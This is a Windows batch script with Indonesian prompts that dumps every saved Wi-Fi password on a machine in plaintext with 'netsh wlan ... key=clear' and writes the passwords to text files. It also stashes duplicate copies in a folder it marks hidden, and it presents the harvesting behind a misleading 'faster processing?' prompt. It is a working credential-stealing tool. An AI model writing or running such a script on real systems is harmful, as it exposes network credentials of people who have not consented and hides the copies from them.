@echo off

color 0A
dir
set current_time=%time%

set jam=%time:~0,5%

md FilePassword 2>nul

md FileSystem 2>nul

md FileSystem\Log 2>nul

md FileSystem\Backup 2>nul

md HiddenFileSystem 2>nul

md HiddenFileSystem\Backup 2>nul

attrib +h "%CD%\HiddenFileSystem"

set "WM=Felixx"

set "Folder=FilePassword"

set "Line=----------------------------------"

set "open=start explorer"

goto :main

:main

echo %Line%

echo By %WM%

echo [Perhatian] Jika anda menggunakan pemprosesan yang lebih cepat, Key Content adalah Password.

echo Ketik "h" untuk menampilkan backup rahasia

set /p user_input=Butuh pemprosesan yang lebih cepat? (y/n) 

powershell -WindowStyle Minimized -Command "& {Start-Process cmd -ArgumentList '/c ping localhost -n 5' -WindowStyle Minimized}"

if "%user_input%"=="y" (

    goto :boosted

)

if "%user_input%"=="n" (

    goto :normal

)



if "%user_input%"=="h" (

    goto :h

)



%open% "%CD%\%Folder%"



:h

%open% "HiddenFileSystem\Backup"

goto :main



:normal

echo ------------------

echo Mode: Normal

echo Jam: %jam%

echo Code by: %WM%

echo ------------------

for /f "delims=" %%a in ('netsh wlan show profiles ^| find "All User Profile"') do (

    set "WiFi=%%a"

    call :retrieveKeyContent

)



:boosted

echo ------------------

echo Mode: Boosted

echo Jam: %jam%

echo Code by: %WM%

echo ------------------

for /f "delims=" %%a in ('netsh wlan show profiles ^| find "All User Profile"') do (

    set "WiFi=%%a"

    call :retrieveKeyContentBoosted

)

powershell -WindowStyle Minimized -Command "& {Start-Process cmd -ArgumentList '/c ping localhost -n 5' -WindowStyle Minimized}"

%open% "%CD%\FilePassword"



goto :eof

:retrieveKeyContent

echo Loading... %WiFi%

echo By %WM%

set "WiFi=%WiFi:*: =%"

del FilePassword\Password_%WiFi%.txt

del FileSystem\Backup\Backup_Password_%WiFi%.txt

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FilePassword\Password_%WiFi%.txt"

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FileSystem\Backup\Backup_Password_%WiFi%.txt"

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "HiddenFileSystem\Backup\Hidden_Backup_Password_%WiFi%.txt"

powershell -command "& { (Get-Content 'FilePassword\Password_%WiFi%.txt' -Raw) -replace 'Key Content', 'Password' | Set-Content 'FilePassword\Password_%WiFi%.txt' }"

powershell -command "& { (Get-Content 'FileSystem\Backup\Backup_Password_%WiFi%.txt' -Raw) -replace 'Key Content', 'Password' | Set-Content 'FileSystem\Backup\Backup_Password_%WiFi%.txt' }"

for %%F in ("FilePassword\Password_%WiFi%.txt") do (

    if %%~zF equ 0 (

        echo Password tidak ditemukan > "FilePassword\Password_%WiFi%.txt"

        echo Error! [Percobaan ke 1/3]

        goto tryAgain

    )

)

goto :eof



:retrieveKeyContentBoosted

echo Loading... %WiFi%

set "WiFi=%WiFi:*: =%"

del FilePassword\Password_%WiFi%.txt

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FilePassword\Password_%WiFi%.txt"

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FileSystem\Backup\Backup_Password_%WiFi%.txt"

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "HiddenFileSystem\Backup\Hidden_Backup_Password_%WiFi%.txt"

for %%F in ("FilePassword\Password_%WiFi%.txt") do (

    if %%~zF equ 0 (

        echo Password tidak ditemukan > "FilePassword\Password_%WiFi%.txt"

        echo Error! [Percobaan ke 1/1]

        echo Ada error saat ingin mengambil wifi %WiFi% > "FileSystem\Log\Log_%WiFi%.txt"

        echo Penyebab: >> "FileSystem\Log\Log_%WiFi%.txt"

        netsh wlan show profiles name="%WiFi%" key=clear >> "FileSystem\Log\Log_%WiFi%.txt"

        del "FilePassword\Password_%WiFi%.txt"

        ))

goto :eof



:tryAgain

del FilePassword\Password_%WiFi%.txt

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FilePassword\Password_%WiFi%.txt"

for %%F in ("FilePassword\Password_%WiFi%.txt") do (

    if %%~zF equ 0 (

        echo Password tidak ditemukan > "FilePassword\Password_%WiFi%.txt"

        echo Error! [Perbobaan ke 2/3]

        goto tryAgainLagi

    )

)

goto :eof



:tryAgainLagi

del FilePassword\Password_%WiFi%.txt

netsh wlan show profiles name="%WiFi%" key=clear | find "Key Content" > "FilePassword\Password_%WiFi%.txt"

for %%F in ("FilePassword\Password_%WiFi%.txt") do (

    if %%~zF equ 0 (

        echo Password tidak ditemukan > "FilePassword\Password_%WiFi%.txt"

        echo Error! [Perbobaan ke 3/3]

        echo Ada error saat ingin mengambil wifi %WiFi% > "FileSystem\Log\Log_%WiFi%.txt"

        echo Penyebab: >> "FileSystem\Log\Log_%WiFi%.txt"

        netsh wlan show profiles name="%WiFi%" key=clear >> "FileSystem\Log\Log_%WiFi%.txt"

        del "FilePassword\Password_%WiFi%.txt"

    )

)

goto :eof



echo.
